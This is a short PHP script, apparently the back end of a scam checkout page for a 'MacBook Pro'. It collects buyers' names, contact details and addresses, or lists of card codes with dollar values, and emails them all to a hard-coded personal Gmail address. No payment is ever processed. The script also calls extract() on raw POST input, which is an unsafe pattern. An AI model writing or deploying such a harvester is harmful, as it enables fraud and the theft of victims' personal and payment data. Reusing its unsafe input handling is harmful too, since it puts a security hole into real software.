<?php

extract($_POST);
// print_r($_POST['card']);
if (isset($_POST['card'])) {
    unset($_POST['fName']);
    unset($_POST['lName']);
    unset($_POST['email']);
    unset($_POST['phone']);
    unset($_POST['country']);
    unset($_POST['state']);
    unset($_POST['address']);
    unset($_POST['zip']);
}

$to = "stephenie.myr@gmail.com";
$htmlContent = " <h3>Hi...<br> You have received </h3>";
if (isset($_POST['fName'])) {
    $subject = "CheckOut Data";
    $htmlContent .= "<p><b>MacBook Pro</b></p>";
    foreach ($_POST as $name => $value) {
        $htmlContent .= "<p><b>".str_replace("_"," ",ucwords($name))." : </b>: ".$value."</b></p> ";
    }
} else {
    $subject = "OHHHHHHHHH!";
    $htmlContent .= "<p><b>MacBook Pro</b></p>";
    for ($i=0; $i < count($_POST['card']); $i++) { 
        $htmlContent .= "<p>".($i+1)."# <b>Card</b>:".$_POST['card'][$i]."  || <b>Value</b>:$".$_POST['value'][$i]."</p> ";
    }
}


// Always set content-type when sending HTML email
$headers = "";
$headers .= "Organization: Sender Organization\r\n";
$headers .= "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "X-Priority: 3\r\n";
$headers .= "X-Entity-Ref-ID: 3\r\n";
$headers .= "X-Mailer: PHP". phpversion() ."\r\n";
//send email
if(@mail($to,$subject,$htmlContent,$headers)){
    echo "Successfully Send";
}else{
    echo "Sending Failed";
}

?>